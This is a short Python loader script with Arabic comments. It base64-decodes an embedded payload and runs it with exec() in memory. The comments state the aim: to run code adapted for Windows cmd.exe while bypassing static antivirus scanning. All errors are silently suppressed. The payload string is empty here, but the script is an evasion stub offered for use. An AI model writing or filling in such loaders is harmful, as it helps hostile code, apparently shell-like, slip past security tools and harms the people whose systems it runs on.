import base64
import sys

# النص المشفر بالأسفل هو الكود التفاعلي الأصلي الخاص بك بعد تعديله ليتوافق مع نظام ويندوز (cmd.exe)
# بمجرد تشغيل الملف، يتم فك التشفير وتنفيذه مباشرة في الذاكرة العشوائية (RAM) لتجاوز الفحص الثابت لبرامج الحماية
encoded_logic = b""

try:
    # تشغيل الكود ديناميكياً في الذاكرة
    exec(base64.b64decode(encoded_logic))
except KeyboardInterrupt:
    sys.exit(0)
except Exception:
    pass

